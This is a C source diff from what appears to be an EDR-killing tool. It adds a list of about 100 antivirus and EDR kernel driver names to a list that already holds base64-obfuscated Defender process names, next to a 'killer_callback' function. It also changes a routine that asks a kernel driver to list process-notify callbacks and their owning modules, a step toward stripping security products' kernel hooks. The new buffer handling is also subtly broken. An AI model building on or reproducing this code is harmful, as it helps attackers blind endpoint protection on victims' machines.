@@ -32,6 +32,21 @@ int stop_term_thread = 0;
 #define _CRT_SECURE_NO_WARNINGS
 
 
+struct ModulesData {
+    CHAR ModuleName[256];
+    ULONG64 ModuleBase;
+};
+
+//struct ModulesDataNode {
+//    ModulesData Data;
+//    ModulesDataNode* Next;
+//};
+
+struct ModulesDataArray {
+    ModulesData* Modules;
+    SIZE_T Count;
+};
+
 const char* edrNames[] = {
 "U2Vuc2VJUi5leGU=",                       // SenseIR.exe
 "U2VjSGVhbHRoVUkuZXhl",                  // SecHealthUI.exe
@@ -44,6 +59,33 @@ const char* edrNames[] = {
 "U2Vuc2VOZHIuZXhl",                      // SenseNdr.exe
 "U2Vuc2VUVk0uZXhl",                      // SenseTVM.exe
 "TmlzU3J2LmV4ZQ=="                       // NisSrv.exe
+};
+
+
+// Array of driver names to monitor
+const char* monitoredDrivers[] = {
+    "EX64.sys", "Eng64.sys", "teefer2.sys", "teefer3.sys", "srtsp64.sys",
+    "srtspx64.sys", "srtspl64.sys", "Ironx64.sys", "fekern.sys", "cbk7.sys",
+    "WdFilter.sys", "cbstream.sys", "atrsdfw.sys", "avgtpx86.sys",
+    "avgtpx64.sys", "naswSP.sys", "edrsensor.sys", "CarbonBlackK.sys",
+    "parity.sys", "csacentr.sys", "csaenh.sys", "csareg.sys", "csascr.sys",
+    "csaav.sys", "csaam.sys", "rvsavd.sys", "cfrmd.sys", "cmdccav.sys",
+    "cmdguard.sys", "CmdMnEfs.sys", "MyDLPMF.sys", "im.sys", "csagent.sys",
+    "CybKernelTracker.sys", "CRExecPrev.sys", "CyOptics.sys", "CyProtectDrv32.sys",
+    "CyProtectDrv64.sys", "groundling32.sys", "groundling64.sys", "esensor.sys",
+    "edevmon.sys", "ehdrv.sys", "FeKern.sys", "WFP_MRT.sys", "xfsgk.sys",
+    "fsatp.sys", "fshs.sys", "HexisFSMonitor.sys", "klifks.sys", "klifaa.sys",
+    "Klifsm.sys", "mbamwatchdog.sys", "mfeaskm.sys", "mfencfilter.sys",
+    "PSINPROC.SYS", "PSINFILE.SYS", "amfsm.sys", "amm8660.sys", "amm6460.sys",
+    "eaw.sys", "SAFE-Agent.sys", "SentinelMonitor.sys", "SAVOnAccess.sys",
+    "savonaccess.sys", "sld.sys", "pgpwdefs.sys", "GEProtection.sys",
+    "diflt.sys", "sysMon.sys", "ssrfsf.sys", "emxdrv2.sys", "reghook.sys",
+    "spbbcdrv.sys", "bhdrvx86.sys", "bhdrvx64.sys", "symevent.sys", "vxfsrep.sys",
+    "VirtFile.sys", "SymAFR.sys", "symefasi.sys", "symefa.sys", "symefa64.sys",
+    "SymHsm.sys", "evmf.sys", "GEFCMP.sys", "VFSEnc.sys", "pgpfs.sys",
+    "fencry.sys", "symrg.sys", "ndgdmk.sys", "ssfmonm.sys", "SISIPSFileFilter.sys",
+    "cyverak.sys", "cyvrfsfd.sys", "cyvrmtgn.sys", "tdevflt.sys", "tedrdrv.sys",
+    "tedrpers.sys", "telam.sys", "cyvrlpc.sys", "MpKslf8d86dba.sys", "mssecflt.sys"
 };
 
 
@@ -170,24 +212,33 @@ void killer_callback(HANDLE hDevice) {
 
 BOOL ListProcNotifyRoutine(HANDLE hDevice) {
     DWORD bytesReturned;
-	LPVOID outputBuffer = NULL;
-	DWORD outputBufferSize = sizeof(LPVOID);
-    
-    BOOL result = DeviceIoControl(
-        hDevice,
-		IOCTL_LIST_PROC_CALLBACK,
+    ModulesDataArray* resultArray = { 0 };
+	ULONG64 modulesCount = 0;
+	BOOL result;
+
+
+
+	resultArray = (ModulesDataArray*)malloc(sizeof(ModulesData) * 64);
+
+    result = DeviceIoControl(
+		hDevice,
+        IOCTL_LIST_PROC_CALLBACK,
         NULL,
         0,
-        &outputBuffer,
-        outputBufferSize,
-        &bytesReturned,
-		NULL
-    );
-    if (result) {
-        printf("Process Notify Routine Address: 0x%p\n", outputBuffer);
-    }
-    else {
-        fprintf(stderr, "Failed to get Process Notify Routine. Error: %lu\n", GetLastError());
+		resultArray,
+        sizeof(ModulesData) * 64,
+		&bytesReturned,
+        NULL
+	);
+	if (!result || bytesReturned == 0 || resultArray->Modules == NULL) {
+        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
+        free(resultArray->Modules);
+        return FALSE;
+	}
+    for (size_t i = 0; i < bytesReturned / sizeof(ModulesData); i++) {
+        if (resultArray->Modules[i].ModuleBase == 0)
+			break;
+        printf("Process Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray->Modules[i].ModuleName, resultArray->Modules[i].ModuleBase);
 	}
 
     return result;
